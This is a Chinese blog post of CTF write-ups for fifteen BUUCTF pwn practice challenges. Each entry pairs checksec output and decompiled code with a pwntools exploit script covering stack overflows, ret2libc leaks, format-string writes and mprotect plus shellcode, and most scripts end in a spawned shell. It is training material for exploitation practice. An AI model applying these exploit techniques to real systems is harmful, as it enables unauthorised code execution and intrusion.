---
title: BUU_PWN刷题_0x01-0x0F
date: 2021-06-01 
tags: PWN
categories: Technology
---




## 0x1.test_your_nc

nc一下就完事。

## 0x2.rip

checksec：

```
yutao@pwnbaby:~/Desktop$ checksec pwn1
[*] '/home/yutao/Desktop/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

ida打开，有个后门函数：fun()

双击s到stack of main，15字节，exp：

```python
from pwn import *
io = process("./pwn1")
payload = 'a'*(0xf + 8) + p64(0x40118a)
#具体86还是87/8a要看linux版本，太新的话写86会导致crash，所以题目写了是Ubuntu18
io.sendline(payload)
io.recv()
io.interactive()
```

## 0x3.warmup_csaw_2016

```
yutao@pwnbaby:~/Desktop$ file warmup_csaw_2016 
warmup_csaw_2016: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=7b7d75c51503566eb1203781298d9f0355a66bd3, stripped

yutao@pwnbaby:~/Desktop$ checksec warmup_csaw_2016
[*] '/home/yutao/Desktop/warmup_csaw_2016'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

程序首先将后门函数sub_40060D的地址给了出来，之后输入v5，0x40+8.

exp：

```python
from pwn import *
#context.log_level = 'debug'
#p = process("./warmup_csaw_2016")
p = remote("node3.buuoj.cn",28063)
payload = "a"*72 + p64(0x40060D)
p.sendline(payload)
p.recvline()
p.interactive()
```

## 0x4.pwn1_sctf_2016

```
yutao@pwnbaby:~/Desktop$ file pwn1_sctf_2016 
pwn1_sctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4b1df4d30f1d6b75666c64bed078473a4ad8e799, not stripped
yutao@pwnbaby:~/Desktop$ checksec pwn1_sctf_2016
[*] '/home/yutao/Desktop/pwn1_sctf_2016'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

ida打开看了下，有个vuln()函数，还有个get_flag()函数。

vuln函数中，将I转为you，输入的s有长度限制(32)，所以转换之后最长可以有32*3的长度，大于3C==60.

所以我们输入20个I，在写入4个垃圾数据，最后覆盖地址。

exp：

```python
from pwn import *
#io = process("./level0")
io = remote("node3.buuoj.cn", 25512)
payload = b'I'*20 + b'a'*4 + p64(0x8048F0D)
io.send(payload)
io.interactive()
```

## 0x5.ciscn_2019_n_1

```
yutao@pwnbaby:~/Desktop$ file ciscn_2019_n_1 
ciscn_2019_n_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8a733f5404b1e2c65e1758c7d92821eb8490f7c5, not stripped
yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_1
[*] '/home/yutao/Desktop/ciscn_2019_n_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

有个func()函数，输入的是v1，但是比较的是v2，将v2改为11.28125就OK

浮点数改为十六进制的话有脚本可以跑，下面说一下具体是怎么实现的。

首先11.28125转二进制的话是1011.01001。单精度浮点数是4个字节，也就是32位。

其中最高位是符号位，0为正，1为负。

接下来的8位是指数位。剩下的23位是尾数部分。

1011.01001 ==  1011.01001\*2^0  ==  1.01101001\*2^3

所以指数位就是（127+指数(3) ）的二进制表示，也就是1000 0010，至于为什么是127，规定。。

连起来就是01000001001101001000000000000000，十六进制表示就是0x4134800。

所以将v2覆盖为上面的值就OK。

exp：

```python
from pwn import *
#io = process("./ciscn_2019_n_1")
io = remote("node3.buuoj.cn", 26204)
payload = b'a'*(0x30-4) + p64(0x41348000)
io.send(payload)
io.interactive()
```

## 0x6.jarvisoj_level0

```
yutao@pwnbaby:~/Desktop$ file level0 
level0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped
yutao@pwnbaby:~/Desktop$ checksec level0
[*] '/home/yutao/Desktop/level0'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

ida打开，有个后门函数，也有个vulnerable_function()函数

exp：

```python
from pwn import *
#io = process("./level0")
io = remote("node3.buuoj.cn", 28745)
payload = b'a'*(0x88) + p64(0x40059A)
io.send(payload)
io.interactive()
```

## 0x7.ciscn_2019_c_1

```
yutao@pwnbaby:~/Desktop$ file ciscn_2019_c_1 
ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped
yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_c_1
[*] '/home/yutao/Desktop/ciscn_2019_c_1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

程序的漏洞在encrypt()函数里面，可以发现在gets时，存在栈溢出的漏洞，这题并没有后门函数，但有puts函数，可以用来泄露libc版本并构造ROP链。

在\_\_libc\_csu\_init()函数的最后有个pop rdi,ret，可以用来构造ROP。

如果输入的字符串太少是不会进行加密的，

程序刚运行：

```
pwndbg> x/gx 0x6020ac
0x6020ac <x>:	0x0000000000000000
```

进行一次加密后：

```
pwndbg> x/gx 0x6020ac
0x6020ac <x>:	0x000000000000005b
```

我们构造的payload是120，满足需要加密的条件。

exp1：

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
# io = process('./ciscn_2019_c_1')
io = remote('node3.buuoj.cn','29497')
e = ELF('./ciscn_2019_c_1')

pop_rdi = 0x400c83
ret_addr = 0x4006b9#这里是用来平等栈的，因为题目环境是Ubuntu18
#Ubuntu18调用system时要对齐栈，需要加一个ret来平衡，否则会crash。
puts_plt = e.plt['puts']
puts_got = e.got['puts']


payload = 0x58*'a' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(e.symbols['main'])
io.sendlineafter("your choice!\n","1")
io.sendlineafter("to be encrypted\n",payload)

io.recvuntil("Ciphertext\n")
io.recvline()

puts_addr = u64(io.recv(6).ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
io.sendlineafter("your choice!\n","1")
# gdb.attach(io)
payload = 0x58 * 'a' + p64(ret_addr) +p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
# 也可以多加几个ret，看出栈对齐的字节数。
io.sendlineafter("to be encrypted\n",payload)
io.recvuntil("Ciphertext\n")
io.recvline()
io.sendline('/bin/sh')
io.sendline(payload)
io.interactive()
```

也有另一种绕过加密的方法，就是让v0>=strlen(s)，我们可以让strlen(s)的长度为0，也就是让字符串的第一个字符为“\x00”，那样strlen函数读取到第一个字符串就会终止，就可以绕过加密。

exp2：

```python
from pwn import*
from LibcSearcher import *
context.log_level = 'debug'
#io = remote("node3.buuoj.cn" , 27728)
elf = ELF("./ciscn_2019_c_1")
io = process("./ciscn_2019_c_1")

puts_plt =elf.plt["puts"]
puts_got= elf.got["puts"]
pop_rid_ret = 0x400c83
main_addr = 0x400b28

io.recvuntil("Welcome to this Encryption machine\n")
io.sendline('1')

payload1 = b"\x00" + b"A"*(80 - 1 + 8) + p64(pop_rid_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.recvuntil("Input your Plaintext to be encrypted")
io.sendline(payload1)

io.recv()
io.recvuntil('\n\n')
puts_addr = io.recvuntil('\n',True)
puts_addr = u64(puts_addr.ljust(8,b'\x00'))
#puts_addr = puts_addr.ljust(8,b'\x00')
print("------------------->",hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)
sys_libc = libc.dump('system')
bin_sh_libc = libc.dump('str_bin_sh')
puts_libc = libc.dump('puts')
retn = 0x4006B9

sys_addr = puts_addr + (sys_libc - puts_libc)
bin_addr = puts_addr + (bin_sh_libc - puts_libc)

io.recvuntil("Welcome to this Encryption machine\n")
io.sendline('1')

io.recvuntil("Input your Plaintext to be encrypted")
payload2 = b"\x00" + b"A"*(80 - 1 + 8) + p64(retn) + p64(pop_rid_ret) + p64(bin_addr) + p64(sys_addr) + b'A'*8
io.sendline(payload2)

io.interactive()
```

还有一种，就是老老实实的按照加密的思路写payload。

exp3：

```python
from pwn import *
from LibcSearcher import *


def encrypt(s):
    newstr = list(s)
    for i in range(len(newstr)):
        c = ord(s[i])
        if c <= 96 or c > 122:
            if c <= 64 or c > 90:
                if c > 47 and c <= 57:
                    c ^= 0xF
            else:
               c ^= 0xE
        else:
            c ^= 0xD
        newstr[i] = chr(c)
    return ''.join(newstr)

elf = ELF('./ciscn_2019_c_1')
#p = process('./ciscn_2019_c_1')
p = remote('node3.buuoj.cn',29497)

start = 0x400B28
rdi_addr = 0x400c83
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
p.sendlineafter("choice!",'1')

payload="a"*0x58
payload+=p64(rdi_addr)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(start)
p.sendlineafter("encrypted",encrypt(payload))
p.recvuntil('Ciphertext\n')
p.recvuntil('\n')
puts_leak = u64(p.recvuntil('\n', drop=True).ljust(8,'\x00'))
log.success('puts_addr = ' + hex(puts_leak))
libc = LibcSearcher('puts', puts_leak)
libc_base = puts_leak - libc.dump('puts')
sys_addr = libc_base + libc.dump('system')
bin_sh_addr = libc_base + libc.dump('str_bin_sh')
payload1="a"*0x58
ret = 0x4006b9
payload1+=p64(ret)
payload1+=p64(rdi_addr)
payload1+=p64(bin_sh_addr)
payload1+=p64(sys_addr)
p.sendlineafter("choice!",'1')
p.sendlineafter("encrypted",payload1)
p.interactive()
```

还有一种写法，ret2csu也可。

## 0x8.[OGeek2019]babyrop

```
yutao@pwnbaby:~/Desktop$ file pwn
pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6503b3ef34c8d55c8d3e861fb4de2110d0f9f8e2, stripped
yutao@pwnbaby:~/Desktop$ checksec pwn
[*] '/home/yutao/Desktop/pwn'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

首先要绕过验证：

```c
fd = open("/dev/urandom", 0);
if ( fd > 0 )
  read(fd, &buf, 4u);
v2 = sub_804871F(buf);
```

和上道题一样，可以用\x00来绕过。并且return的v5在buf数组后面，可以写

再之后就是：

```c
  if ( a1 == 127 )
    result = read(0, &buf, 0xC8u);
  else
    result = read(0, &buf, a1);
```

这里的a1就是之前返回的v5（我们在buf后面复写的值），当然是越大越好，所以就0xff \* 7

即：\x00 + 0xff  \* 7

exp1：leak read

```python
# -*- coding:utf-8 -*-
from pwn import *
from LibcSearcher import *

r=remote('node3.buuoj.cn',28548)
#r=process('./pwn')
elf=ELF('./pwn')
write_plt=elf.plt['write']
read_got=elf.got['read']
read_plt=elf.plt['read']
main_addr=0x8048825

payload1='\x00'+'\xff'*0x7
r.sendline(payload1)
r.recvuntil('Correct\n')

#泄露read的got地址
payload='a'*0xe7+'b'*0x4

payload+=p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)
r.sendline(payload)

read_addr=u32(r.recv(4))
print(hex(read_addr)

libc=LibcSearcher('read',read_addr)
libc_base=read_addr-libc.dump('read')
system_addr=libc_base+libc.dump('system')
bin_sh_addr=libc_base+libc.dump('str_bin_sh')

r.sendline(payload1)
r.recvuntil('Correct\n')

payload='a'*0xe7+'b'*0x4
payload+=p32(system_addr)+ p32(0xdeadbeef)+p32(bin_sh_addr)
r.sendline(payload)

r.interactive()
```

exp2:leak write

```python 
#!/usr/bin/env python
#-*-coding=UTF-8-*-

from pwn import *

sh = remote('node3.buuoj.cn',28548)

elf = ELF('./pwn')
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = 0x08048825

libc = ELF('./libc-2.23.so')
libc_system_addr = libc.symbols['system']
libc_binsh_addr = next(libc.search('/bin/sh'))
libc_write_addr = libc.symbols['write']

bypass_payload = '\x00' #bypass strncmp() 
bypass_payload += '\xff'*7 
sh.sendline(bypass_payload)

offset2ebp = 0xe7
leak_payload = 'a'*offset2ebp + 'aaaa'
leak_payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got)

sh.sendlineafter('Correct\n',leak_payload)

leak_write_addr = u32(sh.recv()[0:4])

libc_baseaddr = leak_write_addr - libc_write_addr
system_addr = libc_system_addr + libc_baseaddr
binsh_addr = libc_binsh_addr + libc_baseaddr

sh.sendline(bypass_payload)
payload = 'a'*offset2ebp + 'bbbb'
payload += p32(system_addr) + 'retn' + p32(binsh_addr)
sh.sendlineafter('Correct\n',payload)
sh.interactive()
```

## 0x9.[第五空间2019 决赛]PWN5

格式化字符串漏洞

```python 
from pwn import *
context(log_level='debug')
#io = process("./pwn")
io = remote('node3.buuoj.cn',25276)
dword_804C044 = 0x804C044
io.recvuntil("name:")
payload = fmtstr_payload(10,{dword_804C044:0x1111})
io.sendline(payload)
io.recvuntil(":")
io.sendline(str(0x1111))
io.interactive()
```

```
$ cat flag
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[DEBUG] Received 0x2b bytes:
    'flag{18b6ca26-1d7d-407b-8b08-63dd66d4e775}\n'
flag{18b6ca26-1d7d-407b-8b08-63dd66d4e775}
```

## 0xA.get_started_3dsctf_2016

```
gwt@ubuntu:~/Desktop$ checksec  get_started_3dsctf_2016 
[*] '/home/gwt/Desktop/get_started_3dsctf_2016'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
gwt@ubuntu:~/Desktop$ file get_started_3dsctf_2016 
get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
```

两个有用的函数：

main中：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[56]; // [esp+4h] [ebp-38h] BYREF

  printf("Qual a palavrinha magica? ", v4[0]);
  gets(v4);
  return 0;
}
```

还有个get_flag：

```c
void __cdecl get_flag(int a1, int a2)
{
  int v2; // esi
  unsigned __int8 v3; // al
  int v4; // ecx
  unsigned __int8 v5; // al

  if ( a1 == 814536271 && a2 == 425138641 )
  {
    v2 = fopen("flag.txt", "rt");
    v3 = getc(v2);
    if ( v3 != 255 )
    {
      v4 = v3;
      do
      {
        putchar(v4);
        v5 = getc(v2);
        v4 = v5;
      }
      while ( v5 != 255 );
    }
    fclose(v2);
  }
}
```

### 方法一：

本地不能通，看了国外的wp，应该是buu的问题

绕过if判断，直接到flag

```
from pwn import*

p=process('./get_started_3dsctf_2016')
payload='a'*0x38+p32(0x80489bb)
p.sendline(payload)
p.interactive()
```

或者

```Python
from pwn import *
q = remote('node3.buuoj.cn',29154)
#q = process('./get_started_3dsctf_2016')
context.log_level = 'debug'
#sleep(0.1)
get_addr = 0x080489A0
exit_addr = 0x0804E6A0
a1 = 814536271
a2 = 425138641
payload = 'a'*(56)
payload += p32(get_addr) + p32(exit_addr)
payload += p32(a1) + p32(a2)
q.sendline(payload)
sleep(0.1)
q.recv()
```

### 方法二：修改内存段的权限

mprotect函数，可以修改内存段的权限

```c
int mprotect(void *addr, size_t len, int prot);
addr 内存启始地址
len  修改内存的长度
prot 内存的权限
```

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x80ea000 r-xp    a2000 0      /home/gwt/Desktop/get_started_3dsctf_2016
 0x80ea000  0x80ec000 rw-p     2000 a1000  /home/gwt/Desktop/get_started_3dsctf_2016
 0x80ec000  0x80ed000 rw-p     1000 0      
 0x844a000  0x846c000 rw-p    22000 0      [heap]
0xf7ff6000 0xf7ff9000 r--p     3000 0      [vvar]
0xf7ff9000 0xf7ffb000 r-xp     2000 0      [vdso]
0xff9ba000 0xff9db000 rw-p    21000 0      [stack]
```

思路：

 ```text
 栈溢出到mprotect函数（call==push+jmp）
 所以ret后要留一个返回地址，因为ret就相当于jmp到mprotect。
 payload大致为：
 payload = 'a'*0x38+p32(mprotect_add)+p32(ret_add)
 payload+=p32(argu1) + p32(argu2) +p32 (argu3)
 第一个参数是被修改内存的地址：0x80ea000
 第二个参数是被修改内存的大小：必须是页的整数倍，0x1000
 第三参数值权限：0x7
 然后找个pop来平衡堆栈：
 ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret'
 因为是3个参数，就找3个pop
 现在payload：
 payload = 'a' + 0x38 + p32(mprotect_addr)
 payload += p32(pop3_addr) + p32(mem_addr) + p32(mem_size) +p32 (mem_proc)
 payload += p32(ret_addr2)
 
 ret_addr2是read函数的地址，将shellcode写入内存。
 read函数原型：
 ssize_t read(int fd, void *buf, size_t count);
 fd 设为0时就可以从输入端读取内容
 buf 设为我们想要执行的内存地址    
 size 适当大小，足够写入shellcode就OK
 ```

​    完整exp：

```python
from pwn import *
elf = ELF('./get_started_3dsctf_2016')
r = process('./get_started_3dsctf_2016')
pop3_ret = 0x804951D
mem_addr = 0x80ec000 
mem_size = 0x1000    
mem_proc = 0x7       

mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']


payload  = 'A' * 0x38
payload += p32(mprotect_addr)
payload += p32(pop3_ret) 
payload += p32(mem_addr) 
payload += p32(mem_size)  
payload += p32(mem_proc)   
payload += p32(read_addr)
payload += p32(pop3_ret)  
payload += p32(0)     
payload += p32(mem_addr)   
payload += p32(0x1000) 
payload += p32(mem_addr) 

r.sendline(payload)
payload = asm(shellcraft.sh()) 
r.sendline(payload)
r.interactive()
```



## 0xB.ciscn_2019_en_2

和ciscn_2019_c_1是一模一样的...

ret2libc.

```python
from pwn import *
from LibcSearcher import *
context(log_level='DEBUG')
#io = process("./ciscn_2019_en_2")
io = remote('node3.buuoj.cn',29045)
elf = ELF("./ciscn_2019_en_2")
ret = 0x04006b9
pop_rdi_ret = 0x0400c83
main = 0x400B28

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload = 0x58 * 'a'+ p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+ p64(main)

io.recvuntil("choice!")
io.sendline("1")
io.recvuntil("encrypted")
io.sendline(payload)
io.recvuntil("Ciphertext")
io.recvline()
io.recvline()
puts_addr =u64(io.recvuntil("\n")[:-1].ljust(8,'\0'))

libc = LibcSearcher("puts",puts_addr)
base = puts_addr - libc.dump('puts')
system_addr = base + libc.dump("system")
bin_sh = base + libc.dump('str_bin_sh')

payload = 0x58*'a'+p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+ p64(system_addr)
#Ubuntu18调用system时要ret，不然会crash
#栈对齐
io.sendline('1')
io.recvuntil("encrypted")
io.sendline(payload)
io.interactive()

#gdb.attach(io)
```

## 0xC.jarvisoj_level2

```
gwt@ubuntu:~/Desktop$ file level2 
level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped

gwt@ubuntu:~/Desktop$  checksec level2 
[*] '/home/gwt/Desktop/level2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

没后门函数，重要的部分：

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF
  system("echo Input:");
  return read(0, buf, 0x100u);
}
```

有/bin/sh字符串。而且没开PIE，字符串的地址不会变

```python 
from pwn import *
context(log_level='DEBUG')
elf = ELF("./level2")
#io = process("./level2")
#node3.buuoj.cn:28929
io = remote('node3.buuoj.cn',28929)
sys_plt = elf.plt['system']
#bin_sh = 0x0804A024
bin_sh = next(elf.search('/bin/sh'))
payload = 'a'*140 +p32(sys_plt)+p32(0xdeadbeef)+p32(bin_sh)
io.recv()
io.sendline(payload)
io.interactive()
```

## 0xD.ciscn_2019_n_8

```
yutao@pwnbaby:~/Desktop$ checksec ciscn_2019_n_8
[*] '/home/yutao/Desktop/ciscn_2019_n_8'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp-14h] [ebp-20h]
  int v5; // [esp-10h] [ebp-1Ch]

  var[13] = 0;
  var[14] = 0;
  init();
  puts("What's your name?");
  __isoc99_scanf("%s", var, v4, v5);
  if ( *&var[13] )
  {
    if ( *&var[13] == 17LL )
      system("/bin/sh");
    else
      printf(
        "something wrong! val is %d",
        var[0],
        var[1],
        var[2],
        var[3],
        var[4],
        var[5],
        var[6],
        var[7],
        var[8],
        var[9],
        var[10],
        var[11],
        var[12],
        var[13],
        var[14]);
  }
  else
  {
    printf("%s, Welcome!\n", var);
    puts("Try do something~");
  }
  return 0;
}
```

所以payload：

```python
from pwn import *
context(log_level='DEBUG')
#io = process("./ciscn_2019_n_8")
io = remote('node3.buuoj.cn',29560 )
io.recv() 
payload = p32(17) * 14
io.sendline(payload)
io.interactive()
```

## 0xE.not_the_same_3dsctf_2016

就两个有用的函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[45]; // [esp+Fh] [ebp-2Dh] BYREF

  printf("b0r4 v3r s3 7u 4h o b1ch4o m3m0... ");
  gets(v4);
  return 0;
}
int get_secret()
{
  int v0; // esi

  v0 = fopen("flag.txt", &unk_80CF91B);
  fgets(&fl4g, 45, v0);
  return fclose(v0);
}
```

和get_started_3dsctf_2016一样，用mprotect修改内存的权限。

```python
from pwn import *
elf = ELF('./not_the_same_3dsctf_2016')
#r = process('./not_the_same_3dsctf_2016')
io=remote('node3.buuoj.cn',29052)
pop_ret = 0x08050b45
#pop ebx ; pop esi ; pop edi ; ret
mem_addr = 0x80ec000 
mem_size = 0x1000    
mem_proc = 0x7       
mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']
payload  = 'A' * 0x2d
payload += p32(mprotect_addr)
payload += p32(pop_ret) 
payload += p32(mem_addr) 
payload += p32(mem_size)  
payload += p32(mem_proc)   
payload += p32(read_addr)
payload += p32(pop_ret)  
payload += p32(0)     
payload += p32(mem_addr)   
payload += p32(0x100) 
payload += p32(mem_addr)   
io.sendline(payload)
payload = asm(shellcraft.sh()) 
io.sendline(payload)
io.interactive()
```



## 0xF.bjdctf_2020_babystack

有个后门函数。主程序：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

```
-0000000000000010 buf             db 12 dup(?)
-0000000000000004 nbytes          dq ?
+0000000000000004                 db ? ; undefined
+0000000000000005                 db ? ; undefined
+0000000000000006                 db ? ; undefined
+0000000000000007                 db ? ; undefined
+0000000000000008  r              db 8 dup(?)
```

这个题，两个思路吧（其实是一样的），一个就是将输入的nbytes开大一点，直接可以覆盖到返回地址。

或者就是整数溢出，根据size_t与unsigned int的不同来做（其实也是将nbytes(buf)开的很大，覆盖返回地址）。

```python
from pwn import *
#io = process("./bjdctf_2020_babystack")
io = remote('node3.buuoj.cn',26217)
context(log_level='DEBUG')
io.recv()
back_door = 0x004006E6 
io.sendline("100")#或者这里改为-1
io.recv()
payload = 'a'*0x18+p64(back_door)+p64(0xdeadbeef)
io.sendline(payload)
io.interactive()
```

